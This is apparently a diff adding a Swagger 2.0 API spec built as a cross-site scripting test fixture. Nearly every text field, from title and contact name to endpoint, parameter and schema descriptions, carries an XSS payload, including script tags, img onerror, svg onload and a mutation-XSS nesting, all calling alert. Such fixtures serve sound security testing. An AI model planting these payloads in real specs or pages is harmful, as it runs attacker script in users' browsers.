@@ -1,0 +1,47 @@
+swagger: '2.0'
+info:
+  title: 'XSS Test API <img src=x onerror=alert(document.domain)>'
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_FOUND_IN_HRBUDDY') src=1>"></form>
+  version: '1.0.0'
+  contact:
+    name: '<svg/onload=alert(document.cookie)>'
+    email: 'test@test.com'
+basePath: /api
+schemes:
+  - https
+consumes:
+  - application/json
+produces:
+  - application/json
+paths:
+  /test:
+    get:
+      summary: 'Test Endpoint <script>alert("Path XSS")</script>'
+      description: '<img src=x onerror=alert("Description XSS")>'
+      operationId: testEndpoint
+      tags:
+        - Test
+      responses:
+        '200':
+          description: 'Success <svg/onload=alert("Response XSS")>'
+          schema:
+            type: object
+            properties:
+              message:
+                type: string
+                description: '<img src=x onerror=alert("Schema XSS")>'
+  /vulnerable:
+    post:
+      summary: 'Vulnerable Endpoint'
+      description: '<script>alert(document.domain)</script>'
+      parameters:
+        - name: body
+          in: body
+          required: true
+          description: '<img src=x onerror=alert("Parameter XSS")>'
+          schema:
+            type: object
+      responses:
+        '201':
+          description: Created
